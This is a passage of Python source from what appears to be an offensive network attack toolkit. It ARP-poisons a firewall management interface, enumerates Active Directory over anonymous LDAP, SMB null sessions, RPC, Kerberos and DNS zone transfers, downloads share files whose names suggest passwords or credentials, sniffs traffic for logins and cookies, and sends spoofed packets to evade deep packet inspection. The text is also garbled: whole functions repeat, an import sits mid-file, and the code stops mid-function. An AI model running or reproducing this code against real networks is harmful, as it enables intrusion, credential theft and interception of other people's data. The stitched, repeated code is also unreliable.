    print(f"[Firewall] Hijacking management interface {target_ip}")
    
    our_mac = get_if_hwaddr(iface)
    
    # ARP poison the firewall's management interface
    arp_poison = Ether(src=our_mac, dst="ff:ff:ff:ff:ff:ff")/ \
                ARP(op=2, psrc=gateway_ip, pdst=target_ip, 
                    hwsrc=our_mac, hwdst="ff:ff:ff:ff:ff:ff")
    
    sendp(arp_poison, iface=iface, loop=1, inter=1, verbose=False)
    l2_attacks_active['fw_mgmt_hijack'] = True
    print("[Firewall] Management interface hijacking started")

# Add to the existing code after the firewall attack functions

def provoke_ad_extraction(target_ip, techniques="all"):
    """
    Provoke Active Directory to reveal information through various techniques
    """
    print(f"[AD-Provoke] Extracting information from {target_ip} using provocative techniques")
    
    results = {}
    
    # Technique 1: LDAP anonymous binds with various queries
    if techniques == "all" or "ldap" in techniques:
        print("[AD-Provoke] Attempting LDAP anonymous information extraction")
        ldap_queries = [
            '(objectClass=*)',
            '(objectClass=user)',
            '(objectClass=group)',
            '(objectClass=computer)',
            '(objectClass=organizationalUnit)',
            '(objectClass=domainDNS)',
            '(objectClass=trustedDomain)'
        ]
        
        for query in ldap_queries:
            try:
                result = subprocess.run([
                    'ldapsearch', '-x', '-h', target_ip, '-b', 'dc=domain,dc=com',
                    query, 'dn'
                ], capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0 and "dn:" in result.stdout:
                    count = result.stdout.count('dn:')
                    print(f"[AD-Provoke] LDAP query '{query}': {count} objects found")
                    results[f'ldap_{query}'] = count
            except:
                pass
    
    # Technique 2: SMB null session enumeration
    if techniques == "all" or "smb" in techniques:
        print("[AD-Provoke] SMB null session enumeration")
        try:
            result = subprocess.run([
                'smbclient', '-L', target_ip, '-N'
            ], capture_output=True, text=True, timeout=15)
            
            if "Sharename" in result.stdout:
                shares = []
                for line in result.stdout.split('\n'):
                    if "Disk" in line or "IPC" in line:
                        share_name = line.split()[0]
                        shares.append(share_name)
                        print(f"[AD-Provoke] Found share: {share_name}")
                
                results['smb_shares'] = shares
                
                # Try to access each share
                for share in shares:
                    try:
                        share_result = subprocess.run([
                            'smbclient', f'\\\\{target_ip}\\{share}', '-N', '-c', 'ls'
                        ], capture_output=True, text=True, timeout=10)
                        
                        if share_result.returncode == 0:
                            print(f"[AD-Provoke] Successfully accessed {share}")
                            results[f'share_{share}_access'] = True
                    except:
                        pass
        except Exception as e:
            print(f"[AD-Provoke] SMB error: {e}")
    
    # Technique 3: DNS zone transfers
    if techniques == "all" or "dns" in techniques:
        print("[AD-Provoke] Attempting DNS zone transfer")
        try:
            result = subprocess.run([
                'dig', '@' + target_ip, 'domain.com', 'AXFR'
            ], capture_output=True, text=True, timeout=15)
            
            if "XFR" in result.stdout and "failed" not in result.stdout:
                records = result.stdout.count('IN\t')
                print(f"[AD-Provoke] DNS zone transfer successful: {records} records")
                results['dns_axfr'] = records
                
                # Extract interesting records
                if "DC=" in result.stdout:
                    dcs = [line for line in result.stdout.split('\n') if "DC=" in line]
                    results['dns_dcs'] = dcs[:5]  # First 5 DC records
        except:
            pass
    
    # Technique 4: RPC enumeration
    if techniques == "all" or "rpc" in techniques:
        print("[AD-Provoke] RPC enumeration")
        rpc_commands = [
            'enumdomusers',
            'enumdomgroups',
            'enumdomains',
            'querydominfo',
            'netshareenumall',
            'lsaquery'
        ]
        
        for cmd in rpc_commands:
            try:
                result = subprocess.run([
                    'rpcclient', '-U', '', '-N', target_ip, '-c', cmd
                ], capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0 and result.stdout.strip():
                    lines = len(result.stdout.split('\n'))
                    print(f"[AD-Provoke] RPC {cmd}: {lines} lines of output")
                    results[f'rpc_{cmd}'] = lines
            except:
                pass
    
    # Technique 5: Kerberos pre-authentication checks
    if techniques == "all" or "kerberos" in techniques:
        print("[AD-Provoke] Kerberos user enumeration")
        common_users = ['administrator', 'guest', 'krbtgt', 'admin', 'test']
        
        for user in common_users:
            try:
                result = subprocess.run([
                    'nmap', '-p', '88', '--script', 'krb5-enum-users', 
                    '--script-args', f'krb5-enum-users.realm=DOMAIN.COM,userdb={user}', target_ip
                ], capture_output=True, text=True, timeout=10)
                
                if "exists" in result.stdout:
                    print(f"[AD-Provoke] User {user} exists")
                    results[f'user_{user}'] = True
            except:
                pass
    
    return results

def provoke_fileserver_extraction(target_ip, share_name=None):
    """
    Provoke file server to reveal files and data
    """
    print(f"[Fileserver-Provoke] Extracting information from {target_ip}")
    
    results = {}
    
    # Discover shares if not specified
    if not share_name:
        try:
            result = subprocess.run([
                'smbclient', '-L', target_ip, '-N'
            ], capture_output=True, text=True, timeout=15)
            
            shares = []
            for line in result.stdout.split('\n'):
                if "Disk" in line and "IPC" not in line:
                    share_name = line.split()[0]
                    shares.append(share_name)
            
            print(f"[Fileserver-Provoke] Found shares: {shares}")
            results['shares'] = shares
            
            # Try each share
            for share in shares:
                share_results = provoke_share_extraction(target_ip, share)
                results.update(share_results)
                
        except Exception as e:
            print(f"[Fileserver-Provoke] Error: {e}")
    else:
        # Target specific share
        results.update(provoke_share_extraction(target_ip, share_name))
    
    return results

def provoke_share_extraction(target_ip, share_name):
    """
    Extract information from specific share
    """
    results = {}
    print(f"[Share-Provoke] Examining share {share_name} on {target_ip}")
    
    try:
        # List share contents
        result = subprocess.run([
            'smbclient', f'\\\\{target_ip}\\{share_name}', '-N', '-c', 'ls'
        ], capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            files = []
            directories = []
            
            for line in result.stdout.split('\n'):
                if "D" in line and "IPC" not in line:
                    # Directory
                    dir_name = line.split()[-1]
                    if dir_name not in ['.', '..']:
                        directories.append(dir_name)
                elif "A" in line:
                    # File
                    file_name = line.split()[-1]
                    files.append(file_name)
            
            print(f"[Share-Provoke] Found {len(files)} files, {len(directories)} directories")
            results[f'share_{share_name}_files'] = files[:10]  # First 10 files
            results[f'share_{share_name}_dirs'] = directories[:5]  # First 5 directories
            
            # Look for interesting files
            interesting_patterns = [
                'password', 'secret', 'config', 'backup', 'database',
                'user', 'account', 'login', 'credential', 'key'
            ]
            
            interesting_files = []
            for file in files:
                if any(pattern in file.lower() for pattern in interesting_patterns):
                    interesting_files.append(file)
            
            if interesting_files:
                print(f"[Share-Provoke] Interesting files: {interesting_files}")
                results[f'share_{share_name}_interesting'] = interesting_files
            
            # Try to download small interesting files
            for interesting_file in interesting_files[:3]:  # Limit to 3 files
                try:
                    download_result = subprocess.run([
                        'smbclient', f'\\\\{target_ip}\\{share_name}', '-N', 
                        '-c', f'get {interesting_file}'
                    ], capture_output=True, text=True, timeout=30)
                    
                    if download_result.returncode == 0:
                        print(f"[Share-Provoke] Downloaded {interesting_file}")
                        results[f'downloaded_{interesting_file}'] = True
                        
                        # Read file contents if small
                        if os.path.exists(interesting_file) and os.path.getsize(interesting_file) < 10000:
                            with open(interesting_file, 'r') as f:
                                content = f.read()[:500]  # First 500 chars
                                results[f'content_{interesting_file}'] = content
                except:
                    pass
            
            # Check for common directories
            common_dirs = ['Users', 'Documents', 'Shares', 'Data', 'Backup']
            for common_dir in common_dirs:
                if common_dir in directories:
                    print(f"[Share-Provoke] Found common directory: {common_dir}")
                    # Try to list common directory
                    try:
                        dir_result = subprocess.run([
                            'smbclient', f'\\\\{target_ip}\\{share_name}', '-N', 
                            '-c', f'ls {common_dir}'
                        ], capture_output=True, text=True, timeout=15)
                        
                        if dir_result.returncode == 0:
                            results[f'dir_{common_dir}_contents'] = dir_result.stdout[:200]  # First 200 chars
                    except:
                        pass
        
    except Exception as e:
        print(f"[Share-Provoke] Error: {e}")
    
    return results

def provoke_dns_extraction(target_ip, domain=None):
    """
    Provoke DNS server to reveal information
    """
    print(f"[DNS-Provoke] Extracting information from DNS server {target_ip}")
    
    results = {}
    
    # Try zone transfer first
    if domain:
        domains_to_try = [domain]
    else:
        # Common domain guesses
        domains_to_try = [
            'domain.com', 'corp.local', 'company.com', 
            'internal.com', 'localdomain', 'ad.local'
        ]
    
    for test_domain in domains_to_try:
        try:
            result = subprocess.run([
                'dig', '@' + target_ip, test_domain, 'AXFR'
            ], capture_output=True, text=True, timeout=15)
            
            if "XFR" in result.stdout and "failed" not in result.stdout:
                records = []
                for line in result.stdout.split('\n'):
                    if "IN" in line and not line.startswith(';'):
                        records.append(line.strip())
                
                print(f"[DNS-Provoke] Zone transfer successful for {test_domain}: {len(records)} records")
                results['zone_transfer'] = records[:20]  # First 20 records
                
                # Extract specific record types
                record_types = {}
                for record in records:
                    if "A" in record:
                        record_types.setdefault('A', []).append(record)
                    elif "MX" in record:
                        record_types.setdefault('MX', []).append(record)
                    elif "NS" in record:
                        record_types.setdefault('NS', []).append(record)
                    elif "SRV" in record:
                        record_types.setdefault('SRV', []).append(record)
                
                for rtype, recs in record_types.items():
                    results[f'dns_{rtype}_records'] = recs[:10]  # First 10 of each type
                
                break
        except:
            pass
    
    # DNS enumeration techniques
    dns_queries = [
        # Common records
        ('A', domain or 'domain.com'),
        ('MX', domain or 'domain.com'),
        ('NS', domain or 'domain.com'),
        ('SOA', domain or 'domain.com'),
        ('TXT', domain or 'domain.com'),
        
        # AD-specific records
        ('SRV', '_ldap._tcp.dc._msdcs.' + (domain or 'domain.com')),
        ('SRV', '_kerberos._tcp.dc._msdcs.' + (domain or 'domain.com')),
        ('SRV', '_gc._tcp.' + (domain or 'domain.com')),
        ('SRV', '_ldap._tcp.pdc._msdcs.' + (domain or 'domain.com')),
        ('SRV', '_kpasswd._tcp.' + (domain or 'domain.com')),
    ]
    
    for qtype, qname in dns_queries:
        try:
            result = subprocess.run([
                'dig', '@' + target_ip, qtype, qname
            ], capture_output=True, text=True, timeout=10)
            
            if "ANSWER SECTION" in result.stdout:
                answers = []
                in_section = False
                for line in result.stdout.split('\n'):
                    if "ANSWER SECTION" in line:
                        in_section = True
                        continue
                    if in_section and line.strip() and not line.startswith(';'):
                        answers.append(line.strip())
                    elif in_section and not line.strip():
                        break
                
                if answers:
                    print(f"[DNS-Provoke] {qtype} {qname}: {len(answers)} answers")
                    results[f'dns_{qtype}_{qname.replace(".", "_")}'] = answers
        except:
            pass
    
    # DNS cache snooping (try to query for non-existent records)
    nonexistent_queries = [
        'nonexistent12345.domain.com',
        'test12345.corp.local',
        'ghost98765.internal'
    ]
    
    for query in nonexistent_queries:
        try:
            result = subprocess.run([
                'dig', '@' + target_ip, 'A', query
            ], capture_output=True, text=True, timeout=10)
            
            # Check if we get interesting responses even for non-existent records
            if "NXDOMAIN" not in result.stdout:
                print(f"[DNS-Provoke] Interesting response for non-existent {query}")
                results[f'dns_weird_{query}'] = result.stdout[:200]
        except:
            pass
    
    return results

def provoke_policy_extraction(target_ip):
    """
    Attempt to extract group policies and other policy information
    """
    print(f"[Policy-Provoke] Extracting policy information from {target_ip}")
    
    results = {}
    
    # Try to access SYSVOL share (where GPOs are stored)
    try:
        result = subprocess.run([
            'smbclient', f'\\\\{target_ip}\\SYSVOL', '-N', '-c', 'ls'
        ], capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            print("[Policy-Provoke] SYSVOL share accessible")
            results['sysvol_access'] = True
            
            # Look for domain directory
            domains = []
            for line in result.stdout.split('\n'):
                if "D" in line and "domain" in line.lower():
                    domain_dir = line.split()[-1]
                    domains.append(domain_dir)
            
            if domains:
                domain = domains[0]
                print(f"[Policy-Provoke] Found domain: {domain}")
                
                # Try to access Policies directory
                policies_result = subprocess.run([
                    'smbclient', f'\\\\{target_ip}\\SYSVOL', '-N', 
                    '-c', f'ls {domain}\\Policies'
                ], capture_output=True, text=True, timeout=15)
                
                if policies_result.returncode == 0:
                    policies = []
                    for line in policies_result.stdout.split('\n'):
                        if "D" in line and "{" in line and "}" in line:
                            policy_id = line.split()[-1]
                            policies.append(policy_id)
                    
                    print(f"[Policy-Provoke] Found {len(policies)} GPOs")
                    results['gpo_count'] = len(policies)
                    results['gpo_ids'] = policies[:5]  # First 5 GPOs
                    
                    # Try to examine a GPO
                    if policies:
                        sample_gpo = policies[0]
                        try:
                            gpo_result = subprocess.run([
                                'smbclient', f'\\\\{target_ip}\\SYSVOL', '-N',
                                '-c', f'ls {domain}\\Policies\\{sample_gpo}'
                            ], capture_output=True, text=True, timeout=15)
                            
                            if gpo_result.returncode == 0:
                                gpo_contents = []
                                for line in gpo_result.stdout.split('\n'):
                                    if "D" in line or "A" in line:
                                        item = line.split()[-1]
                                        gpo_contents.append(item)
                                
                                results['sample_gpo_contents'] = gpo_contents
                                
                                # Look for specific policy files
                                interesting_files = ['GPT.INI', 'Registry.pol', 'Groups.xml']
                                for interesting_file in interesting_files:
                                    if interesting_file in gpo_contents:
                                        print(f"[Policy-Provoke] Found policy file: {interesting_file}")
                                        results[f'found_{interesting_file}'] = True
                        except:
                            pass
    except Exception as e:
        print(f"[Policy-Provoke] Error: {e}")
    
    # Check for other policy-related shares
    policy_shares = ['NETLOGON', 'SYSVOL', 'Scripts']
    for share in policy_shares:
        try:
            result = subprocess.run([
                'smbclient', f'\\\\{target_ip}\\{share}', '-N', '-c', 'ls'
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"[Policy-Provoke] Accessible policy share: {share}")
                results[f'policy_share_{share}'] = True
        except:
            pass
    
    return results

def provoke_data_transfer_interception(iface, target_ip, duration=60):
    """
    Monitor for data transfers and attempt interception
    """
    print(f"[Data-Intercept] Monitoring data transfers to/from {target_ip} for {duration} seconds")
    
    intercepted_data = []
    
    def packet_handler(pkt):
        if pkt.haslayer(IP) and (pkt[IP].src == target_ip or pkt[IP].dst == target_ip):
            # Look for data transfers
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                payload = pkt[Raw].load
                
                # Check for common data patterns
                if len(payload) > 100:  # Significant data transfer
                    # Look for file signatures or interesting data
                    file_signatures = {
                        b'PK\x03\x04': 'ZIP',
                        b'%PDF': 'PDF',
                        b'\xFF\xD8\xFF': 'JPEG',
                        b'\x89PNG': 'PNG',
                        b'Microsoft': 'Office',
                        b'<!DOCTYPE': 'HTML',
                        b'<?xml': 'XML',
                    }
                    
                    for sig, file_type in file_signatures.items():
                        if sig in payload[:20]:
                            print(f"[Data-Intercept] Possible {file_type} file transfer detected")
                            intercepted_data.append({
                                'time': datetime.now(),
                                'type': file_type,
                                'size': len(payload),
                                'source': pkt[IP].src,
                                'destination': pkt[IP].dst,
                                'sample': payload[:100].hex()  # First 100 bytes as hex
                            })
                            break
                    
                    # Look for credentials or sensitive data patterns
                    sensitive_patterns = [
                        b'password=', b'user=', b'login=', b'credential=',
                        b'Authorization:', b'Cookie:', b'SessionID=',
                    ]
                    
                    for pattern in sensitive_patterns:
                        if pattern in payload:
                            print(f"[Data-Intercept] Sensitive data pattern found: {pattern}")
                            # Extract context around the pattern
                            start = max(0, payload.find(pattern) - 20)
                            end = min(len(payload), start + 100)
                            context = payload[start:end]
                            
                            intercepted_data.append({
                                'time': datetime.now(),
                                'type': 'sensitive_data',
                                'pattern': pattern.decode(),
                                'context': context.decode('utf-8', errors='ignore'),
                                'source': pkt[IP].src,
                                'destination': pkt[IP].dst
                            })
                            break
    
    # Start sniffing
    sniff_thread = threading.Thread(
        target=lambda: sniff(iface=iface, filter=f"host {target_ip}", prn=packet_handler, timeout=duration),
        daemon=True
    )
    sniff_thread.start()
    
    # Generate some traffic to provoke responses
    provoke_traffic = [
        IP(dst=target_ip)/TCP(dport=445, flags="S"),  # SMB
        IP(dst=target_ip)/TCP(dport=139, flags="S"),  # NetBIOS
        IP(dst=target_ip)/TCP(dport=80, flags="S"),   # HTTP
        IP(dst=target_ip)/TCP(dport=443, flags="S"),  # HTTPS
        IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com")),  # DNS
    ]
    
    for packet in provoke_traffic:
        sendp(Ether()/packet, iface=iface, verbose=False)
        time.sleep(1)
    
    sniff_thread.join()
    
    print(f"[Data-Intercept] Completed. Intercepted {len(intercepted_data)} data events")
    return intercepted_data

            
def firewall_dpi_bypass(iface, target_ip):
    """
    Detect and exploit DPI misclassifications
    """
    print(f"[Firewall] Testing DPI bypass on {target_ip}")
    
    our_mac = get_if_hwaddr(iface)
    
    # Various techniques to bypass DPI
    bypass_techniques = [
        # HTTP traffic on non-standard port
        lambda: Ether(src=our_mac)/IP(src="192.168.1.100", dst=target_ip)/TCP(sport=8080, dport=8080)/Raw(load="GET / HTTP/1.1\r\nHost: google.com\r\n\r\n"),
        
# [Continuing from the previous code...]

        # TLS traffic on non-standard port  
        lambda: Ether(src=our_mac)/IP(src="192.168.1.100", dst=target_ip)/TCP(sport=4433, dport=4433)/Raw(load=bytes.fromhex("1603010001010001")),
        
        # DNS tunneling attempt
        lambda: Ether(src=our_mac)/IP(src="192.168.1.100", dst=target_ip)/UDP(sport=5353, dport=53)/DNS(rd=1, qd=DNSQR(qname="dns.tunnel.google.com")),
        
        # ICMP tunneling attempt
        lambda: Ether(src=our_mac)/IP(src="192.168.1.100", dst=target_ip)/ICMP(type=8, code=0)/Raw(load="TUNNEL_DATA"),
        
        # Fragmented packets to evade DPI
        lambda: fragment(Ether(src=our_mac)/IP(src="192.168.1.100", dst=target_ip)/TCP(dport=80)/Raw(load="GET / HTTP/1.1\r\nHost: google.com\r\n\r\n")),
    ]
    
    for i, technique in enumerate(bypass_techniques):
        try:
            packet = technique()
            sendp(packet, iface=iface, verbose=False)
            print(f"[Firewall] Sent DPI bypass technique {i+1}")
            time.sleep(0.5)
        except Exception as e:
            print(f"[Firewall] DPI bypass error: {e}")
    
    print("[Firewall] DPI bypass testing completed")

# Add to the existing code after the firewall attack functions

def provoke_ad_extraction(target_ip, techniques="all"):
    """
    Provoke Active Directory to reveal information through various techniques
    """
    print(f"[AD-Provoke] Extracting information from {target_ip} using provocative techniques")
    
    results = {}
    
    # Technique 1: LDAP anonymous binds with various queries
    if techniques == "all" or "ldap" in techniques:
        print("[AD-Provoke] Attempting LDAP anonymous information extraction")
        ldap_queries = [
            '(objectClass=*)',
            '(objectClass=user)',
            '(objectClass=group)',
            '(objectClass=computer)',
            '(objectClass=organizationalUnit)',
            '(objectClass=domainDNS)',
            '(objectClass=trustedDomain)'
        ]
        
        for query in ldap_queries:
            try:
                result = subprocess.run([
                    'ldapsearch', '-x', '-h', target_ip, '-b', 'dc=domain,dc=com',
                    query, 'dn'
                ], capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0 and "dn:" in result.stdout:
                    count = result.stdout.count('dn:')
                    print(f"[AD-Provoke] LDAP query '{query}': {count} objects found")
                    results[f'ldap_{query}'] = count
            except:
                pass
    
    # Technique 2: SMB null session enumeration
    if techniques == "all" or "smb" in techniques:
        print("[AD-Provoke] SMB null session enumeration")
        try:
            result = subprocess.run([
                'smbclient', '-L', target_ip, '-N'
            ], capture_output=True, text=True, timeout=15)
            
            if "Sharename" in result.stdout:
                shares = []
                for line in result.stdout.split('\n'):
                    if "Disk" in line or "IPC" in line:
                        share_name = line.split()[0]
                        shares.append(share_name)
                        print(f"[AD-Provoke] Found share: {share_name}")
                
                results['smb_shares'] = shares
                
                # Try to access each share
                for share in shares:
                    try:
                        share_result = subprocess.run([
                            'smbclient', f'\\\\{target_ip}\\{share}', '-N', '-c', 'ls'
                        ], capture_output=True, text=True, timeout=10)
                        
                        if share_result.returncode == 0:
                            print(f"[AD-Provoke] Successfully accessed {share}")
                            results[f'share_{share}_access'] = True
                    except:
                        pass
        except Exception as e:
            print(f"[AD-Provoke] SMB error: {e}")
    
    # Technique 3: DNS zone transfers
    if techniques == "all" or "dns" in techniques:
        print("[AD-Provoke] Attempting DNS zone transfer")
        try:
            result = subprocess.run([
                'dig', '@' + target_ip, 'domain.com', 'AXFR'
            ], capture_output=True, text=True, timeout=15)
            
            if "XFR" in result.stdout and "failed" not in result.stdout:
                records = result.stdout.count('IN\t')
                print(f"[AD-Provoke] DNS zone transfer successful: {records} records")
                results['dns_axfr'] = records
                
                # Extract interesting records
                if "DC=" in result.stdout:
                    dcs = [line for line in result.stdout.split('\n') if "DC=" in line]
                    results['dns_dcs'] = dcs[:5]  # First 5 DC records
        except:
            pass
    
    # Technique 4: RPC enumeration
    if techniques == "all" or "rpc" in techniques:
        print("[AD-Provoke] RPC enumeration")
        rpc_commands = [
            'enumdomusers',
            'enumdomgroups',
            'enumdomains',
            'querydominfo',
            'netshareenumall',
            'lsaquery'
        ]
        
        for cmd in rpc_commands:
            try:
                result = subprocess.run([
                    'rpcclient', '-U', '', '-N', target_ip, '-c', cmd
                ], capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0 and result.stdout.strip():
                    lines = len(result.stdout.split('\n'))
                    print(f"[AD-Provoke] RPC {cmd}: {lines} lines of output")
                    results[f'rpc_{cmd}'] = lines
            except:
                pass
    
    # Technique 5: Kerberos pre-authentication checks
    if techniques == "all" or "kerberos" in techniques:
        print("[AD-Provoke] Kerberos user enumeration")
        common_users = ['administrator', 'guest', 'krbtgt', 'admin', 'test']
        
        for user in common_users:
            try:
                result = subprocess.run([
                    'nmap', '-p', '88', '--script', 'krb5-enum-users', 
                    '--script-args', f'krb5-enum-users.realm=DOMAIN.COM,userdb={user}', target_ip
                ], capture_output=True, text=True, timeout=10)
                
                if "exists" in result.stdout:
                    print(f"[AD-Provoke] User {user} exists")
                    results[f'user_{user}'] = True
            except:
                pass
    
    return results

def provoke_fileserver_extraction(target_ip, share_name=None):
    """
    Provoke file server to reveal files and data
    """
    print(f"[Fileserver-Provoke] Extracting information from {target_ip}")
    
    results = {}
    
    # Discover shares if not specified
    if not share_name:
        try:
            result = subprocess.run([
                'smbclient', '-L', target_ip, '-N'
            ], capture_output=True, text=True, timeout=15)
            
            shares = []
            for line in result.stdout.split('\n'):
                if "Disk" in line and "IPC" not in line:
                    share_name = line.split()[0]
                    shares.append(share_name)
            
            print(f"[Fileserver-Provoke] Found shares: {shares}")
            results['shares'] = shares
            
            # Try each share
            for share in shares:
                share_results = provoke_share_extraction(target_ip, share)
                results.update(share_results)
                
        except Exception as e:
            print(f"[Fileserver-Provoke] Error: {e}")
    else:
        # Target specific share
        results.update(provoke_share_extraction(target_ip, share_name))
    
    return results

def provoke_share_extraction(target_ip, share_name):
    """
    Extract information from specific share
    """
    results = {}
    print(f"[Share-Provoke] Examining share {share_name} on {target_ip}")
    
    try:
        # List share contents
        result = subprocess.run([
            'smbclient', f'\\\\{target_ip}\\{share_name}', '-N', '-c', 'ls'
        ], capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            files = []
            directories = []
            
            for line in result.stdout.split('\n'):
                if "D" in line and "IPC" not in line:
                    # Directory
                    dir_name = line.split()[-1]
                    if dir_name not in ['.', '..']:
                        directories.append(dir_name)
                elif "A" in line:
                    # File
                    file_name = line.split()[-1]
                    files.append(file_name)
            
            print(f"[Share-Provoke] Found {len(files)} files, {len(directories)} directories")
            results[f'share_{share_name}_files'] = files[:10]  # First 10 files
            results[f'share_{share_name}_dirs'] = directories[:5]  # First 5 directories
            
            # Look for interesting files
            interesting_patterns = [
                'password', 'secret', 'config', 'backup', 'database',
                'user', 'account', 'login', 'credential', 'key'
            ]
            
            interesting_files = []
            for file in files:
                if any(pattern in file.lower() for pattern in interesting_patterns):
                    interesting_files.append(file)
            
            if interesting_files:
                print(f"[Share-Provoke] Interesting files: {interesting_files}")
                results[f'share_{share_name}_interesting'] = interesting_files
            
            # Try to download small interesting files
            for interesting_file in interesting_files[:3]:  # Limit to 3 files
                try:
                    download_result = subprocess.run([
                        'smbclient', f'\\\\{target_ip}\\{share_name}', '-N', 
                        '-c', f'get {interesting_file}'
                    ], capture_output=True, text=True, timeout=30)
                    
                    if download_result.returncode == 0:
                        print(f"[Share-Provoke] Downloaded {interesting_file}")
                        results[f'downloaded_{interesting_file}'] = True
                        
                        # Read file contents if small
                        if os.path.exists(interesting_file) and os.path.getsize(interesting_file) < 10000:
                            with open(interesting_file, 'r') as f:
                                content = f.read()[:500]  # First 500 chars
                                results[f'content_{interesting_file}'] = content
                except:
                    pass
            
            # Check for common directories
            common_dirs = ['Users', 'Documents', 'Shares', 'Data', 'Backup']
            for common_dir in common_dirs:
                if common_dir in directories:
                    print(f"[Share-Provoke] Found common directory: {common_dir}")
                    # Try to list common directory
                    try:
                        dir_result = subprocess.run([
                            'smbclient', f'\\\\{target_ip}\\{share_name}', '-N', 
                            '-c', f'ls {common_dir}'
                        ], capture_output=True, text=True, timeout=15)
                        
                        if dir_result.returncode == 0:
                            results[f'dir_{common_dir}_contents'] = dir_result.stdout[:200]  # First 200 chars
                    except:
                        pass
        
    except Exception as e:
        print(f"[Share-Provoke] Error: {e}")
    
    return results

import subprocess

def provoke_dns_extraction(target_ip, domain=None):
    """
    Provoke DNS server to reveal information
    """
    print(f"[DNS-Provoke] Extracting information from DNS server {target_ip}")
    results = {}

    # ---------- Zone Transfer ----------
    domains_to_try = [domain] if domain else [
        'domain.com', 'corp.local', 'company.com',
        'internal.com', 'localdomain', 'ad.local'
    ]

    for test_domain in domains_to_try:
        try:
            result = subprocess.run(
                ['dig', '@' + target_ip, test_domain, 'AXFR'],
                capture_output=True, text=True, timeout=15
            )

            if "XFR" in result.stdout and "failed" not in result.stdout:
                records = [
                    line.strip() for line in result.stdout.splitlines()
                    if "IN" in line and not line.startswith(';')
                ]
                print(f"[DNS-Provoke] Zone transfer SUCCESS for {test_domain}: {len(records)} records")

                results['zone_transfer'] = records[:20]

                # Categorize by record type
                record_types = {}
                for record in records:
                    for rtype in ("A", "MX", "NS", "SRV"):
                        if f" {rtype} " in record:
                            record_types.setdefault(rtype, []).append(record)

                for rtype, recs in record_types.items():
                    results[f'dns_{rtype}_records'] = recs[:10]
                break
        except subprocess.TimeoutExpired:
            print(f"[DNS-Provoke] Zone transfer for {test_domain} timed out")
        except Exception as e:
            print(f"[DNS-Provoke] Zone transfer error: {e}")

    # ---------- Enumeration ----------
    base_domain = domain or 'domain.com'
    dns_queries = [
        ('A', base_domain), ('MX', base_domain), ('NS', base_domain),
        ('SOA', base_domain), ('TXT', base_domain),
        ('SRV', f'_ldap._tcp.dc._msdcs.{base_domain}'),
        ('SRV', f'_kerberos._tcp.dc._msdcs.{base_domain}'),
        ('SRV', f'_gc._tcp.{base_domain}'),
        ('SRV', f'_ldap._tcp.pdc._msdcs.{base_domain}'),
        ('SRV', f'_kpasswd._tcp.{base_domain}')
    ]

    for qtype, qname in dns_queries:
        try:
            result = subprocess.run(
                ['dig', '@' + target_ip, qtype, qname],
                capture_output=True, text=True, timeout=10
            )
            if "ANSWER SECTION" in result.stdout:
                answers, in_section = [], False
                for line in result.stdout.splitlines():
                    if "ANSWER SECTION" in line:
                        in_section = True
                        continue
                    if in_section:
                        if line.strip() and not line.startswith(';'):
                            answers.append(line.strip())
                        elif not line.strip():
                            break

                if answers:
                    print(f"[DNS-Provoke] {qtype} {qname}: {len(answers)} answers")
                    results[f'dns_{qtype}_{qname.replace(".", "_")}'] = answers
        except subprocess.TimeoutExpired:
            print(f"[DNS-Provoke] {qtype} query for {qname} timed out")
        except Exception as e:
            print(f"[DNS-Provoke] Error running {qtype} query for {qname}: {e}")

    # ---------- Cache Snooping ----------
    nonexistent_queries = [
        'nonexistent12345.domain.com',
        'test12345.corp.local',
        'ghost98765.internal'
    ]

    for query in nonexistent_queries:
        try:
            result = subprocess.run(
                ['dig', '@' + target_ip, 'A', query],
                capture_output=True, text=True, timeout=10
            )
            if "NXDOMAIN" not in result.stdout:
                print(f"[DNS-Provoke] Interesting response for non-existent {query}")
                results[f'dns_weird_{query}'] = result.stdout[:200]
        except subprocess.TimeoutExpired:
            print(f"[DNS-Provoke] Snooping query for {query} timed out")
        except Exception as e:
            print(f"[DNS-Provoke] Error snooping {query}: {e}")

    return results

def provoke_policy_extraction(target_ip):
    """
    Attempt to extract group policies and other policy information
    """
    print(f"[Policy-Provoke] Extracting policy information from {target_ip}")
    
    results = {}
    
    # Try to access SYSVOL share (where GPOs are stored)
    try:
        result = subprocess.run([
            'smbclient', f'\\\\{target_ip}\\SYSVOL', '-N', '-c', 'ls'
        ], capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            print("[Policy-Provoke] SYSVOL share accessible")
            results['sysvol_access'] = True
            
            # Look for domain directory
            domains = []
            for line in result.stdout.split('\n'):
                if "D" in line and "domain" in line.lower():
                    domain_dir = line.split()[-1]
                    domains.append(domain_dir)
            
            if domains:
                domain = domains[0]
                print(f"[Policy-Provoke] Found domain: {domain}")
                
                # Try to access Policies directory
                policies_result = subprocess.run([
                    'smbclient', f'\\\\{target_ip}\\SYSVOL', '-N', 
                    '-c', f'ls {domain}\\Policies'
                ], capture_output=True, text=True, timeout=15)
                
                if policies_result.returncode == 0:
                    policies = []
                    for line in policies_result.stdout.split('\n'):
                        if "D" in line and "{" in line and "}" in line:
                            policy_id = line.split()[-1]
                            policies.append(policy_id)
                    
                    print(f"[Policy-Provoke] Found {len(policies)} GPOs")
                    results['gpo_count'] = len(policies)
                    results['gpo_ids'] = policies[:5]  # First 5 GPOs
                    
                    # Try to examine a GPO
                    if policies:
                        sample_gpo = policies[0]
                        try:
                            gpo_result = subprocess.run([
                                'smbclient', f'\\\\{target_ip}\\SYSVOL', '-N',
                                '-c', f'ls {domain}\\Policies\\{sample_gpo}'
                            ], capture_output=True, text=True, timeout=15)
                            
                            if gpo_result.returncode == 0:
                                gpo_contents = []
                                for line in gpo_result.stdout.split('\n'):
                                    if "D" in line or "A" in line:
                                        item = line.split()[-1]
                                        gpo_contents.append(item)
                                
                                results['sample_gpo_contents'] = gpo_contents
                                
                                # Look for specific policy files
                                interesting_files = ['GPT.INI', 'Registry.pol', 'Groups.xml']
                                for interesting_file in interesting_files:
                                    if interesting_file in gpo_contents:
